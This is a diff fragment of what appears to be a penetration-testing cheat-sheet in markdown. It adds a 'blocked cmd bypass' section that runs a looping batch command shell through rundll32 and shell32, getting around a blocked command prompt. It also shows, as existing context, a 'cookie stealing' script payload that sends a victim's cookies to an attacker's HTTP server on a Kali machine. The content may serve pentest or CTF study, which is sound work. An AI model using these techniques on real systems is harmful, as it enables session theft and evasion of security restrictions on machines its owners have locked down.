@@ -126,6 +126,22 @@ int main(int argc, char *argv[])
 * `sudo du -xh --max-depth=1 /var`
 * `sudo du -xh --max-depth=1 /var/log`
 
+## blocked cmd bypass
+
+* create a batch file and run it with: `rundll32.exe shell32.dll,ShellExec_RunDLL c:\users\<username>\desktop\command.bat`
+* output for the command will be written in output.txt
+* can tweak it to your liking, including cmd=<command> and enter
+* great resource **[here]([url](https://lolbas-project.github.io/lolbas/Libraries/Shell32/))**
+
+```
+@echo off
+:Loop
+echo %cd%^>
+set /p cmd=Type your command here
+%cmd% >> c:\users\<username>\desktop\output.txt
+Goto Loop
+```
+
 ## cookie stealing
 
 * `<script>new Image().src="http://<python3 http server running in kali IP>:<PORT>/cool.jpg?output="+document.cookie;</script>`
